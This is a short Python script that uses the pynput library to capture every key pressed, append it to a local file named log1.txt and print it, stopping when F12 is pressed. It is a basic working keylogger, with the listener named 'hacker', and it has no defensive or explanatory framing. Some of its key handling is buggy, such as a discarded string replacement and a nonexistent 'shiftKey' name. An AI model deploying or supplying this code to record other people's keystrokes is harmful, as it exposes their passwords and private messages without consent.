from pynput.keyboard import Listener

def anonymous(key):
    key = str(key)
    key.replace("'"," ")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.ctrl_l":
        key = "ctrl"
    if key == "Key.enter":
        key = "/n"
    if key == "Key.tab":
        key = "/t"
    if key == "Key.shiftKey":
        key = "shift"
    with open("log1.txt", "a") as file:
        file.write(key)
    print(key)

with Listener(on_press=anonymous) as hacker:
    hacker.join()